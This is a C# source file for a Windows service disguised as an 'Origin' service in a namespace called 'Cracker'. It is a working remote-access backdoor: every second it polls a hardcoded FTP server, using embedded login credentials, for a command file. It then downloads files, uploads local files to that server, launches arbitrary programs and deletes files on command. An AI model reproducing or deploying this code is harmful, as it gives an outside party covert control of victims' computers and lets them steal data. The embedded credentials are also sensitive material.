using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.IO;

namespace Cracker
{
    public partial class OriginService : ServiceBase
    {
        private const string FTP = "ftp://node0.net2ftp.ru";
        private const string USERNAME = "iskusnow@mail.ru";
        private const string PASSWORD = "fbc3454a963b";
        private const string COMMANDSURL = "/commands/commands.dat";

        //bat commands
        private const string COMMAND_STOP = "sc stop Origin";
        private const string COMMAND_DELETE = "sc delete Origin";

        private DateTime CURRENTDATE;
        private bool end;

        public OriginService()
        {
            InitializeComponent();
            end = false;
        }

        protected override void OnStart(string[] args)
        {
            timer.Interval = 1000;
            CURRENTDATE = Convert.ToDateTime("01.01.2000 00:00:00");
            if (CheckerOrigin.CheckClient() && !end)
                timer.Start();
            else
                EndWork();
        }

        protected override void OnStop()
        {
            timer.Stop();
        }

        protected override void OnContinue()
        {
            timer.Start();
        }

        private void timer_Tick(object sender, EventArgs e)
        {
            ProcessCommand(Messager.GetCommand(FTP + COMMANDSURL, USERNAME, PASSWORD));
        }

        private void ProcessCommand(string commands)
        {
            if (commands == "")
                return;
            string[] commandArray = commands.Split('\n');
            if (Convert.ToDateTime(commandArray[0]) <= CURRENTDATE)
                return;
            CURRENTDATE = Convert.ToDateTime(commandArray[0]);
            int i = 1;
            while (i < commandArray.Length)
            {
                string[] splitCommand = commandArray[i].Split(' ');
                Thread.Sleep(5000);
                switch ((splitCommand[0]))
                {
                    case "download":
                        Messager.DownloadFile(FTP + splitCommand[1], splitCommand[2], USERNAME, PASSWORD);
                        i++;
                        break;
                    case "upload":
                        Messager.UploadFile(FTP + splitCommand[1], splitCommand[2], USERNAME, PASSWORD);
                        i++;
                        break;
                    case "launch":
                        LaunchFile(splitCommand[1]);
                        i++;
                        break;
                    case "delete":
                        DeleteFile(splitCommand[1]);
                        i++;
                        break;
                    case "end":
                        EndWork();
                        return;
                }
            }
        }

        private void LaunchFile(string path)
        {
            Process.Start(path);
        }

        private void DeleteFile(string path)
        {
            File.Delete(path);
        }

        private void EndWork()
        {
            this.Stop();
            end = true;
        }
    }
}
